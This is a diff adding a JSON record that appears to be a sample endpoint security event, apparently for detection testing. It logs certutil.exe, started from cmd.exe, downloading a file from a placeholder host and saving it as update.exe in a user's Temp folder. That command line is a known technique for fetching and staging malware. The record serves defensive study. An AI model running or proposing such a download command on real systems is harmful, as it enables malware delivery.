@@ -1,0 +1,9 @@
+{
+  "hostname": "WS-ENG-0912",
+  "user": "LAB\\a.ferreira",
+  "file_path": "C:\\Windows\\System32\\certutil.exe",
+  "command_line": "certutil.exe -urlcache -split -f http://files.example/update.txt C:\\Users\\a.ferreira\\AppData\\Local\\Temp\\update.exe",
+  "parent_process": "C:\\Windows\\System32\\cmd.exe",
+  "remote_ip": "198.51.100.140",
+  "domain": "files.example"
+}
